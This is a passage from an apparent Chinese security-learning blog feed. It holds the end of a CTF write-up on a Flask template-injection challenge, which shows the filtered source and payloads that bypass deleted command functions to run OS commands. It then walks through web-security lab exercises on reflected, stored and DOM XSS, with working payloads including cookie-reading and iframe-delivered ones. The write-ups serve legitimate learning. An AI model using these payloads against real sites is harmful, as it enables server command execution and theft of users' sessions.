class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>): <span class="comment"># 判断了name的开头</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name: <span class="comment"># 进行了过滤</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>) <span class="comment"># 注释</span></span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError <span class="comment"># 删除了上面可以执行命令的模块</span></span><br><span class="line">    sys.addaudithook(audit_checker) <span class="comment"># 设计了一个审计钩子</span></span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>ssti模板注入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在jinja模板中，代表注释，是不会渲染在页面上的。</p><p>我们可以提前闭合它，然后就可以回显了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23&#125;&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250802084702830.png" class="" title="image-20250802084702830"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">del</span> os.popen</span><br></pre></td></tr></table></figure><p>删除了os模块的popen属性。</p><p>我们以下面代码为例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, Flask, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;&#123;&#123;1+1&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>我们输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250802093615765.png" class="" title="image-20250802093615765"><p>发生了报错，告诉我们对象os没有popen这个属性。</p><p><code>__import__</code>不会对已经加载的模块重新加载，即使我们后续使用<code>__import__</code>导入这个模块，返回的还是前面已经导入的模块对象。</p><p>del删除的是当前环境的os的popen属性，如果我们想使用popen属性，我们需要使用importlib的reload对os模块重新加载(重新执行一遍模块的代码)。</p><p>多说一些：sys.modules是一个字典，存储了所有已导入的模块。sys.modules[‘os’] 存储的就是os的模块对象（module类型的实例），当我们 import os 时，python会检查sys.modules是否已经有os，如果没有，就会加载它；如果有，直接返回这个模块对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set os=request.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;) %&#125;&#123;&#123;request.__init__.__globals__.__builtins__.__import__(&#x27;importlib&#x27;).reload(os)&#125;&#125;&#123;&#123;os.popen(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250802095729234.png" class="" title="image-20250802095729234"><p>我做这道题的时候，还发现了一个新东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, Flask, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;&#123;&#123;1+1&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250802100802404.png" class="" title="image-20250802100802404"><p>可以看到，我这里使用的是get方法，而且还没有Content-Type:application&#x2F;json，这竟然也可以。</p><p>我以前认为request.data主要传json数据，必须有Content-Type:application&#x2F;json，去官方文档查看了一下：</p><img src="/CTFwp/XYCTF-2025/image-20250802104113272.png" class="" title="image-20250802104113272"><p>接收来自stream的原始数据，加入数据来自表单，则为空。</p><p>即使数据来自表单，也要获取原始数据，可以使用get_data()。</p><p>不管是get方法还是post方法，request.data都可以收到数据。</p><img src="/CTFwp/XYCTF-2025/image-20250802190149906.png" class="" title="image-20250802190149906"><p>~ 在 ssti 模板注入中可以用于连接字符串。</p><p>request.</p>]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/XSS/XSS/"/>
      <url>/XSS/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。</p><p>为了解决实验问题，执行调用该函数的跨站点脚本攻击<code>alert</code>。</p><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>当我们在搜索框输入123：</p><img src="/XSS/XSS/image-20250725110101686.png" class="" title="image-20250725110101686"><p>服务器会回显我们输入的内容。</p><p>如果我们输入：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><img src="/XSS/XSS/image-20250725110228311.png" class="" title="image-20250725110228311"><p>做到这里，实验就完成了。</p><blockquote><p>如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器上执行，这就造成了XSS攻击。</p></blockquote><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含评论功能中的存储跨站点脚本漏洞。</p><p>为了解决这个实验，请提交一条评论，在查看博客文章的评论时调用<code>alert</code>函数。</p><h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>点击一篇博客的view post。</p><img src="/XSS/XSS/image-20250726225005681.png" class="" title="image-20250726225005681"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comment: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其他内容随便输入，但是要注意格式。</p><p>现在提交评论，并返回查看评论，触发alert函数，实验到此结束。</p><blockquote><p>存储型XSS相比较反射型XSS攻击更加危险，反射型XSS还需要我们去诱导受害者访问，存储型XSS是直接保存到服务器上的，当别人查看时，会自动触发。</p></blockquote><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><h3 id="基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS攻击，使用<code>location.search</code>作为攻击源</h3><h4 id="实验要求：-2"><a href="#实验要求：-2" class="headerlink" title="实验要求："></a>实验要求：</h4><p>此实验室包含一个基于 DOM 的跨站点脚本漏洞，该漏洞存在于搜索查询跟踪功能中。该漏洞利用 JavaScript的<code>document.write</code>函数将数据写入页面。该<code>document.write</code>函数调用来自<code>location.search</code>的数据，我们可以通过网站URL控制该数据源。</p><p>为了解决这个实验，请发起一个执行alert函数的跨站点脚本攻击。</p><h4 id="实验过程：-2"><a href="#实验过程：-2" class="headerlink" title="实验过程："></a>实验过程：</h4><p>在搜索页面，输入test123：</p><img src="/XSS/XSS/image-20250727091021107.png" class="" title="image-20250727091021107"><p>f12，打开开发者工具，发现如下javascript代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trackSearch</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>); <span class="comment">// 获取search参数</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">trackSearch</span>(query); <span class="comment">// 调用trackSearch插入数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过”&gt;&lt;”闭合：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/resources/images/tracker.gif?searchTerms=&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250727091921196.png" class="" title="image-20250727091921196"><p>到此实验完成。</p><h3 id="基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</h3><h4 id="实验要求：-3"><a href="#实验要求：-3" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在库存查询功能中存在一个基于DOM的XSS漏洞。该漏洞使用了JavaScript的document.write函数向页面写入数据，而该函数调用了来自location.search的可控数据（您可以通过网站URL控制此参数），这些数据被包裹在select元素内。</p><p>要完成本实验，请构造一个能逃逸select元素并执行alert函数的XSS攻击。</p><h4 id="实验过程：-3"><a href="#实验过程：-3" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验：</p><img src="/XSS/XSS/image-20250727094459612.png" class="" title="image-20250727094459612"><p>点击View details按钮：</p><img src="/XSS/XSS/image-20250727094649167.png" class="" title="image-20250727094649167"><p>可以检测库存，f12打开开发者工具，发现如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(store) &#123;</span><br><span class="line">    <span class="comment">// store 存在 </span></span><br><span class="line">    <span class="comment">// 向页面写入 &#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;</span></span><br><span class="line">    <span class="comment">// 存在 XSS 漏洞</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.<span class="property">length</span>;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);                          </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">storeId=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250727102626335.png" class="" title="image-20250727102626335"><p>实验完成。</p><h3 id="基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞"><a href="#基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞" class="headerlink" title="基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞"></a>基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</h3><h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求:"></a>实验要求:</h4><p>本实验的博客搜索功能存在一个基于DOM的XSS漏洞。该漏洞通过<code>innerHTML</code>赋值操作，使用来自<code>location.search</code>的数据动态修改了div元素的HTML内容。</p><p>要完成本实验，请构造一个能够执行<code>alert</code>函数的跨站脚本攻击。</p><h4 id="实验过程：-4"><a href="#实验过程：-4" class="headerlink" title="实验过程："></a>实验过程：</h4><p>根据实验要求了解到，博客的搜索功能存在DOM型的XSS漏洞。</p><p>在搜索框中输入123：</p><img src="/XSS/XSS/image-20250727105438480.png" class="" title="image-20250727105438480"><p>按f12，打开开发者工具：</p><img src="/XSS/XSS/image-20250727105608795.png" class="" title="image-20250727105608795"><p>发现一段js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doSearchQuery</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerHTML</span> = query; <span class="comment">// 接收器 innerHTML</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="comment">// 攻击源</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">doSearchQuery</span>(query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>innerHTML 已经不在执行secript标签，我们要换一种形式执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;img src=1 onerror=alert(document.domain) /&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250727110104657.png" class="" title="image-20250727110104657"><p>src是路径，由于这是一个非法路径，img标签肯定会解析失败，解析失败触发onerror事件，执行alert函数。</p><h3 id="利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"><a href="#利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞" class="headerlink" title="利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"></a>利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</h3><h4 id="实验要求：-4"><a href="#实验要求：-4" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在”用户反馈提交页面”存在一个基于DOM的XSS漏洞。该漏洞通过jQuery库的<code>$</code>选择器定位a标签，并利用<code>location.search</code>的数据动态修改其<code>href</code>属性。</p><p>要完成此实验，请构造攻击使页面中的”返回”链接被篡改，点击时触发<code>alert(document.cookie)</code>。</p><h4 id="实验过程：-5"><a href="#实验过程：-5" class="headerlink" title="实验过程："></a>实验过程：</h4><img src="/XSS/XSS/image-20250727114012736.png" class="" title="image-20250727114012736"><p>在提交反馈界面存在DOM的XSS漏洞，点击Submit freeback，按F12，打开开发者工具：</p><img src="/XSS/XSS/image-20250727114159206.png" class="" title="image-20250727114159206"><p>发现js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#backLink&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;returnPath&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 将returnPath的值设置给href属性，href属性设置在id为#backLink的a标签中。</span></span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250727114615500.png" class="" title="image-20250727114615500"><p>发送此链接：</p><img src="/XSS/XSS/image-20250727114711283.png" class="" title="image-20250727114711283"><p>点击链接，触发alert(document.cookie)函数，实验完成。</p><h3 id="利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞"><a href="#利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞" class="headerlink" title="利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞"></a>利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</h3><h4 id="实验要求：-5"><a href="#实验要求：-5" class="headerlink" title="实验要求："></a>实验要求：</h4><p>“该实验在主页上存在一个基于 DOM 的跨站脚本（XSS）漏洞。它使用 jQuery 的 <code>$()</code> 选择器函数自动滚动到指定帖子，帖子标题通过 <code>location.hash</code> 属性传递。</p><p>要完成实验，需向受害者投递一个漏洞利用代码，在其浏览器中调用 <code>print()</code> 函数。”</p><h4 id="实验过程：-6"><a href="#实验过程：-6" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验环境，按f12打开开发者工具，进入源码：</p><img src="/XSS/XSS/image-20250728090148823.png" class="" title="image-20250728090148823"><p><code>Ctrl+F</code> 搜索 <code>script</code> 。</p><img src="/XSS/XSS/image-20250728090350901.png" class="" title="image-20250728090350901"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">监听窗口的hashchange事件</span></span><br><span class="line"><span class="comment">window.location.hash 获取描点部分(# 及 # 以后的内容)</span></span><br><span class="line"><span class="comment">slice(start,end) 用于截取,不包含end</span></span><br><span class="line"><span class="comment">decodeURIComponent 用于url解码</span></span><br><span class="line"><span class="comment">$() 表示选择器，选择section元素中class的blog-list部分，在其中查找所有h2标签，使用:contains伪类选择器匹配包含指定文本的h2元素</span></span><br><span class="line"><span class="comment">scrollIntoView 将元素滚动到视口中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250728091507536.png" class="" title="image-20250728091507536"><p>比如我们输入#Passwords</p><img src="/XSS/XSS/image-20250728091718036.png" class="" title="image-20250728091718036"><p>scrollIntoView就会跳转到<code> &lt;h2&gt;Passwords&lt;/h2&gt;</code>。</p><p>location.hash我们可以控制，我们输入恶意代码：<code>&lt;img src=1 onerror=print() /&gt;</code></p><p>$()会解析这段，并将img创建为DOM元素，scrollIntoView将创建好的DOM元素加入到DOM中并进行渲染触发XSS代码。</p><img src="/XSS/XSS/image-20250728092825188.png" class="" title="image-20250728092825188"><p>现在就已经触发了print。</p><p>要完成实验的话，要进入：</p><img src="/XSS/XSS/image-20250728093827800.png" class="" title="image-20250728093827800"><p>向body注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0aaf001e041c2090a807a401006c0035.web-security-academy.net/#&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.src+=&#x27;&lt;img src=1 onerror=print() /&gt;&#x27;&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>store储存起来，然后将漏洞传递给受害者即可完成实验。</p><img src="/XSS/XSS/image-20250728093937822.png" class="" title="image-20250728093937822"><p>第三个按钮。</p><h3 id="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"><a href="#AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码" class="headerlink" title="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"></a>AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</h3><h4 id="实验要求：-6"><a href="#实验要求：-6" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验在搜索功能中存在一个基于DOM的跨站脚本漏洞，漏洞位于AngularJS表达式中。</p><p>AngularJS是一个流行的JavaScript库，它会扫描包含ng-app属性（称为AngularJS指令）的HTML节点内容。当在HTML代码中添加该指令时，您可以在双大括号内执行JavaScript表达式。在尖括号被编码的情况下，这种技术特别有用。</p><p>要完成本实验，请发起一个跨站脚本攻击，执行AngularJS表达式并调用alert函数。</p><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程:"></a>实验过程:</h4><p>F12 打开开发这工具，进入源码：</p><img src="/XSS/XSS/image-20250728114042113.png" class="" title="image-20250728114042113"><p>angular1.7.7。</p><img src="/XSS/XSS/image-20250728114151058.png" class="" title="image-20250728114151058"><p>ng-app属性，可以在body内，通过模板语法：<code>&#123;&#123;&#125;&#125;</code>，进行JavaScript的代码执行，但是只能执行简单的表达式，我们可以通过constructor获取Function构造函数，执行任意表达式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; $on.<span 